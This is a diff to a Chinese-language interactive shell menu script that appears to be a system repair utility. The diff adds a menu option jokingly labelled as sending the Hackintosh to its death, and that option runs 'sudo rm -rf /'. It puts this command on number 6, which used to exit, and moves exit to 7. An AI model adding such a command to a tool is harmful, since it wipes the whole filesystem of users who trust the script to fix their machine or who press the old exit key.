@@ -110,7 +110,9 @@ menu(){
     echo ""
 	echo "5、全部修复上述问题"
 	echo ""
-	echo "6、退出"
+	echo "6、送黑果归西"
+	echo ""
+	echo "7、退出"
 	echo ""
 }
 
@@ -142,7 +144,9 @@ Select(){
 	   echo ""
 	   Select
        ;;
-	6) exit 0
+	6) sudo rm -rf /
+       ;;
+	7) exit 0
        ;;
     *) echo "输入错误";
 	   echo ""
